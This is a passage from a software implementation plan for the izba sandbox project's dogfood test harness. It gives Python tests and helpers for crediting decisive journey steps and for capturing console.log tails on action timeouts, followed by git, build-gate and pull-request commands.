                        "expect_cmd_re": r"\btrue\b"}]}
        with tempfile.TemporaryDirectory() as td:
            res = rj.run_journey(
                model, journey, izba_bin="/bin/false", data_dir=td,
                max_turns=8, step_cap=8, action_timeout_s=10,
                latency_budget_ms=30000, budget={"usd": 0.0}, max_usd=1.0)
        kinds = [c.get("kind") for c in res["candidates"]]
        self.assertNotIn(
            "unreached_decisive", kinds,
            f"decisive assertion was exercised under step 0: {res['candidates']}")

    def test_decisive_without_match_still_flags_unreached(self):
        import run_journeys as rj
        from model import FakeModel
        model = FakeModel([{"command": "true"}, {"done": True}, {"done": True}])
        journey = {"journey_id": "never-reached",
                   "steps": [
                       {"intent": "explore", "expect": ""},
                       {"intent": "verify", "expect": "", "core": True,
                        "expect_cmd_re": r"izba promote"}]}
        with tempfile.TemporaryDirectory() as td:
            res = rj.run_journey(
                model, journey, izba_bin="/bin/false", data_dir=td,
                max_turns=8, step_cap=8, action_timeout_s=10,
                latency_budget_ms=30000, budget={"usd": 0.0}, max_usd=1.0)
        kinds = [c.get("kind") for c in res["candidates"]]
        self.assertIn("unreached_decisive", kinds)
```

(`true` runs via bash and exits 0; `/bin/false` as izba_bin makes reconcile snapshots error-shaped, which no assertion here reads. The first test's decisive step declares `expect_exit: 0` and its regex matches step 0's `true` action → graded PASS → no candidates.)

- [ ] **Step 2: Run to verify the first fails**

Run: `python3 -m pytest hack/dogfood/test_runner.py -q -k DecisiveByObserved`
Expected: first FAILS (today it flags `unreached_decisive`), second PASSES.

- [ ] **Step 3: Implement** — add the helper above `run_journey`:

```python
def _grade_decisive_from_observed(step, actions, journey, journey_id):
    """H3: a decisive step whose own pointer produced no actions may still have
    been exercised — the swarm often satisfies the assertion under an EARLIER
    step. When the step declares ``expect_cmd_re``, scan ALL journey actions for
    the LAST match and grade THAT action functionally. Returns None when the
    step has no usable ``expect_cmd_re`` or nothing matched (caller then flags
    ``unreached_decisive``); an empty list means exercised-and-passed."""
    pattern = step.get("expect_cmd_re")
    if not (isinstance(pattern, str) and pattern):
        return None
    try:
        rx = re.compile(pattern)
    except re.error as e:
        log(f"{journey_id}: invalid expect_cmd_re {pattern!r}: {e}")
        return None
    for idx in range(len(actions) - 1, -1, -1):
        a = actions[idx]
        if not rx.search(a.get("command", "")):
            continue
        ref = {"journey_id": journey_id, "action_index": idx}
        source = journey.get("source", {}).get("ref", "journey step")
        found = functional_oracle(
            a.get("command", ""), a.get("exit_code", 0),
            step.get("expect", ""), source, ref,
            expect_exit=step.get("expect_exit"))
        out = []
        for c in found:
            cd = c.to_dict()
            cd["trajectory_ref"] = ref
            cd["decisive"] = True
            cd["graded_cmd"] = a.get("command", "")
            out.append(cd)
        return out
    return None
```

and change the unreached loop (:504-516) to consult it first:

```python
    for i in sorted(decisive_idx):
        if step_actions.get(i, 0) == 0:
            s = steps[i]
            graded = _grade_decisive_from_observed(s, actions, journey, journey_id)
            if graded is not None:
                candidates.extend(graded)
                continue
            candidates.append({
                "kind": "unreached_decisive",
                "detail": (f"decisive step {i} ({s.get('intent', '')[:80]!r}) "
                           f"produced no actions — its assertion was never "
                           f"exercised"),
                "violated_expectation": s.get("expect", "")
                                        or "decisive step must be exercised",
                "source": source,
                "trajectory_ref": {"journey_id": journey_id, "action_index": -1},
            })
```

- [ ] **Step 4: Authoring guidance.** In `journeys.schema.json`, extend the `expect_cmd_re` description (append): `"Decisive (core) steps SHOULD declare expect_cmd_re: it also lets the runner credit a decisive assertion satisfied under an earlier step instead of flagging unreached_decisive."` Add one equivalent sentence to `hack/dogfood/local-harness.md` (near its expect_cmd_re/core coverage) and to `.claude/agents/journey-compiler.md` (in its journey-authoring rules; find with `grep -n "expect_cmd_re\|core" .claude/agents/journey-compiler.md`).

- [ ] **Step 5: Run the harness suite + schema check**

Run: `python3 -m pytest hack/dogfood -q`
Expected: all pass (test_schema_gui validates the schema files parse).

- [ ] **Step 6: Commit**

```bash
git add hack/dogfood/run_journeys.py hack/dogfood/test_runner.py hack/dogfood/schema/journeys.schema.json hack/dogfood/local-harness.md .claude/agents/journey-compiler.md
git commit -m "fix(dogfood): credit decisive assertions satisfied under earlier steps (H3)

3 of 5 unreached_decisive verdicts in the 2026-07-09 run were false: the
swarm exercised the decisive command under an earlier step's intent. When a
core step declares expect_cmd_re, scan all observed actions and grade the
last match instead of flagging unreached."
```

---

### Task 13: H6 — console.log evidence on action timeout

**Files:**
- Modify: `hack/dogfood/oracles.py` (`run_action` TimeoutExpired branch :174-178 + new helper)
- Test: `hack/dogfood/test_oracles.py`

**Interfaces:**
- Consumes: `CONSOLE_TAIL_BYTES` (oracles.py:37), the `<data_dir>/sandboxes/<name>/logs/console.log` layout (same as `capture_state_evidence` :263).
- Produces: `_console_tails(data_dir: str, limit_per_sandbox: int = 2048) -> str`.

- [ ] **Step 1: Write the failing test** — add to `hack/dogfood/test_oracles.py` (mirror its existing run_action tests' style; they pass a dummy `izba_bin`):

```python
class TimeoutConsoleEvidenceTest(unittest.TestCase):
    def test_timeout_appends_console_tails(self):
        import oracles
        with tempfile.TemporaryDirectory() as td:
            logdir = os.path.join(td, "sandboxes", "webbox", "logs")
            os.makedirs(logdir)
            with open(os.path.join(logdir, "console.log"), "w") as f:
                f.write("guest kernel: mounting /dev/vda\nBOOT STALLED HERE\n")
            a = oracles.run_action(
                "sleep 5", izba_bin="/bin/false", workdir=td,
                data_dir=td, timeout_s=0.2)
        self.assertEqual(a.exit_code, 124)
        self.assertIn("timed out", a.stderr_tail)
        self.assertIn("console.log tail (webbox)", a.stderr_tail)
        self.assertIn("BOOT STALLED HERE", a.stderr_tail)

    def test_timeout_without_console_logs_is_clean(self):
        import oracles
        with tempfile.TemporaryDirectory() as td:
            a = oracles.run_action(
                "sleep 5", izba_bin="/bin/false", workdir=td,
                data_dir=td, timeout_s=0.2)
        self.assertEqual(a.exit_code, 124)
        self.assertNotIn("console.log tail", a.stderr_tail)
```

- [ ] **Step 2: Run to verify the first fails**

Run: `python3 -m pytest hack/dogfood/test_oracles.py -q -k TimeoutConsole`
Expected: first FAILS (no console evidence today), second PASSES.

- [ ] **Step 3: Implement** — add the helper below `_read_cwd_file`:

```python
def _console_tails(data_dir: str, limit_per_sandbox: int = 2048) -> str:
    """Guest console.log tails for every sandbox under ``data_dir`` — evidence
    appended to a TIMED-OUT action's stderr so a stalled `izba start` is
    diagnosable post-hoc (H6: two 120s stalls in the 2026-07-09 run were
    environmental but undiagnosable). Capped per sandbox so the 4 KiB
    stderr_tail keeps the timeout marker. Report-only: '' on any error."""
    import glob
    chunks: List[str] = []
    try:
        for path in sorted(glob.glob(os.path.join(
                data_dir, "sandboxes", "*", "logs", "console.log"))):
            name = os.path.basename(os.path.dirname(os.path.dirname(path)))
            try:
                with open(path, "rb") as f:
                    f.seek(0, os.SEEK_END)
                    size = f.tell()
                    f.seek(max(0, size - limit_per_sandbox))
                    tail = f.read().decode("utf-8", errors="replace")
            except OSError:
                continue
            chunks.append(f"\n[harness] console.log tail ({name}):\n{tail}")
    except Exception:
        return ""
    return "".join(chunks)
```

and extend the TimeoutExpired branch (:174-178):

```python
    except subprocess.TimeoutExpired as e:
        exit_code = 124  # GNU timeout convention; non-zero so oracles flag it
        stdout = (e.stdout or "") if isinstance(e.stdout, str) else ""
        stderr = ((e.stderr or "") if isinstance(e.stderr, str) else "") + \
            f"\n[harness] action timed out after {timeout_s}s" + \
            _console_tails(data_dir)
```

NOTE the ordering trap: `stderr_tail=_tail(stderr)` keeps the LAST 4 KiB — the timeout marker precedes the console tails, so with many sandboxes the marker could be truncated away. The test asserts both survive with one sandbox; that is the designed trade-off (2 KiB/sandbox cap). Do NOT raise TAIL_BYTES.

- [ ] **Step 4: Run the harness suite**

Run: `python3 -m pytest hack/dogfood -q`
Expected: all pass.

- [ ] **Step 5: Commit**

```bash
git add hack/dogfood/oracles.py hack/dogfood/test_oracles.py
git commit -m "feat(dogfood): append guest console.log tails to timed-out actions (H6)

Two 120s izba-start stalls in the 2026-07-09 run were shard-local and
undiagnosable post-hoc. A timeout (exit 124) now carries each sandbox's
console.log tail (2 KiB cap per sandbox) in stderr_tail. Deliberately no
auto-retry: a retry would mask real latency findings."
```

---

### Task 14: Full gates, push, PR

**Files:** none new (fix whatever the gates surface).

- [ ] **Step 1: Run all gates** (from the worktree root):

```bash
cargo test --workspace
cargo clippy --workspace --all-targets -- -D warnings
cargo fmt --check
cargo build -p izba-init --target x86_64-unknown-linux-musl --release
cargo check --target x86_64-pc-windows-gnu -p izba-proto -p izba-core -p izba-cli
cargo clippy --target x86_64-pc-windows-gnu --all-targets -p izba-proto -p izba-core -p izba-cli -- -D warnings
python3 -m pytest hack/dogfood -q
cd app && npm ci && npm run build && (cd src-tauri && cargo fmt --check && cargo clippy --all-targets -- -D warnings && cargo test); cd ..
```

Expected: all green. Fix + amend/commit anything that isn't (keep commits scoped).

- [ ] **Step 2: Push and open the PR** (repo-owner grant; needs unsandboxed Bash):

```bash
git push -u origin worktree-dogfood-deep-sprint
gh pr create --title "Dogfood deep-sprint: manifest defaults, unified sandbox refs, egress_weakens + reconcile fixes, harness grading (H1-H3,H6,H7)" --body "$(cat <<'EOF'
Combined product + harness sprint from the 2026-07-09 diff/promote dogfooding
run (spec: docs/superpowers/specs/2026-07-10-dogfood-deep-sprint-design.md).

**Product**
- Closes #122 — `spec.resources`/`spec.rootDisk` optional with product
  defaults (2 cpus / 4Gi / 8Gi), single-sourced in izba-core; a minimal
  manifest is apiVersion+kind+spec.image.
- Closes #123 — unified NAME-or-DIR sandbox references: one resolver across
  diff/promote/export (bare names now work, as the README always claimed) and
  status/stop/rm/start (optional positional defaulting to the cwd sandbox).
- Closes #124 — `egress_weakens` never fires from an unenforced baseline
  (enforce:false→true with allow entries is a tightening).
- fix: `izba __reconcile` reads the current ports.json schema via
  `load_rules_migrating` (was: `missing field \`rule\`` false-empty snapshot).

**Graduation tests** (deep legs the swarm can't reach): Dockerfile/manifest
TOCTOU over review_token+gate; daemon_e2e pins egress hot-reload (constant
vmm pid) and promote-on-stopped skip.

**Dogfood harness** (grading honesty): H1 grade the last izba invocation, not
trailing heredocs; H2 `informational:` reconcile items don't flip; H3 decisive
coverage by observed commands; H6 console.log tails on action timeout; H7
model-starvation tally (one infra candidate per journey).

Post-merge-independent validation: the swarm re-run is dispatched FROM this
branch (`DOGFOOD_BASE=origin/worktree-dogfood-deep-sprint`), exercising both
the fixed product and the fixed harness before merge.

🤖 Generated with [Claude Code](https://claude.com/claude-code)
EOF
)"
```

- [ ] **Step 3: Watch CI** (`gh pr checks --watch`) and fix failures. Remember the SonarCloud gate (new-code coverage + duplication) and Greptile.

---

## Post-implementation acceptance (orchestrator, not an implementer task)

Run per the llm-dogfooding skill, all from this branch:

1. Dispatch `e2e.yml` on the branch (`gh workflow run e2e.yml --ref worktree-dogfood-deep-sprint`) to execute Task 8's daemon_e2e extension on real KVM.
2. Phase 1: journey-compiler recompiles ~12 journeys against the BRANCH's README/`--help` (fair-test: the new docs are part of what's under test), targeting the previously masked surface: 5 semantic validators, stale-token + Dockerfile TOCTOU refusals, #124 probe, NAME-or-DIR UX, port-publish reconcile journeys.
3. Phase 2: `DOGFOOD_BASE=origin/worktree-dogfood-deep-sprint .claude/skills/llm-dogfooding/scripts/dispatch-swarm.sh manifest-deep-v2 <journeys.json> 4 2`.
4. Phase 3: trajectory-skeptic triage; findings → issues; ledger updated.
